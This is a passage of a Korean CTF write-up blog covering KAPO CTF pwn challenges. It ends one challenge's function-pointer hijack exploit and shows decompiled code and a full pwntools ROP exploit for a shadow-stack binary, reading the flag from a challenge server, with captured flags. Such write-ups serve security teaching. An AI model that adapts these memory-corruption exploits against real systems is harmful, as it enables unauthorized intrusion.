</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;[Love Gauge]: &#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;gauge: {n}&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">oob_sub_at_once</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x77</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">preparing</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ptr</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">interactive</span>()
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">KAPO</span>{<span style="color:#a6e22e">ac98a027d8c41b726576b169f4c5bba187be5bb2d3a9e88523f5ea0a2264ef4a</span>}
</span></span></code></pre></div><p>gamestep을 덮고, 마지막에 SIGSEGV를 내주면 handler가 호출되면서 임의 주소에 대한 호출 primitive를 만들 수 있다.
미리 OoB addition으로 함수 포인터 주소를 만들고 idx를 변조해 임의 주소에 대한 호출을 통해 shell을 획득한다.</p>
<h1 id="avatar-crude-shadow">Avatar: Crude Shadow<a hidden class="anchor" aria-hidden="true" href="#avatar-crude-shadow">#</a></h1>
<h2 id="analysis-5">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-5">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">push_shadow</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">shadow_sp</span>, <span style="color:#a6e22e">shadow_stack</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setup</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init_seccomp</span>();                               <span style="color:#75715e">// useless
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;shadow test&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">menu</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( <span style="color:#66d9ef">in</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print_shadow</span>(<span style="color:#a6e22e">shadow_sp</span>, <span style="color:#a6e22e">shadow_stack</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;string input:&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">buf</span>, <span style="color:#ae81ff">0x400</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">nested_func</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">shadow_sp</span>, <span style="color:#a6e22e">shadow_stack</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;lol you can&#39;t&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;nono&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">exit</span> );
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_shadow</span>(<span style="color:#a6e22e">shadow_sp</span>, <span style="color:#a6e22e">shadow_stack</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pop_shadow</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">shadow_sp</span>, <span style="color:#a6e22e">shadow_stack</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>shadow stack이 구현되어있다.</p>
<h2 id="exploitation-5">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-5">#</a></h2>
<p>bof를 대놓고 준다.</p>
<h3 id="exploit-script-5">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-5">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">pwn</span> <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:</span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recvuntil</span>(<span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\#</span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>(<span style="color:#e6db74">&#39;./avatar&#39;</span>,<span style="color:#a6e22e">env</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;LD_PRELOAD&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;../libc.so.6&#39;</span>})
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">remote</span>(<span style="color:#e6db74">&#39;host3.dreamhack.games&#39;</span>,<span style="color:#ae81ff">10351</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">binary</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ELF</span>(<span style="color:#e6db74">&#39;./avatar&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ELF</span>(<span style="color:#e6db74">&#39;../libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;5&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;:\n&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x29d90</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bin_base</span>  <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1782</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">libc_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">bin_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000029cd6</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x50</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">11</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000029cd6</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000029cd6</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prdi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002a3e5</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000045eb0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prsi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002be51</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prdxr12</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000011f497</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prsi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">bss</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span> <span style="color:#ae81ff">0x500</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdxr12</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x200</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">read</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">bss</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x500</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prsi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdxr12</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">open</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prsi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">bss</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span> <span style="color:#ae81ff">0x500</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdxr12</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x200</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">read</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prsi</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">bss</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span> <span style="color:#ae81ff">0x500</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">prdxr12</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x200</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x200</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">write</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">payload</span>)))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prdxr12</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000011f497</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;input:&#39;</span>,<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;5&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">0.2</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;../flag&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">interactive</span>()
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">POKA</span>{<span style="color:#ae81ff">150_</span><span style="color:#a6e22e">PLUS_ISO_T0T4L_300_HE4D</span>}
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/kaist-postech-ctf/">Kaist Postech CTF</a></li>
      <li><a href="https://msh1307.kr/tags/kapo-ctf/">KAPO CTF</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
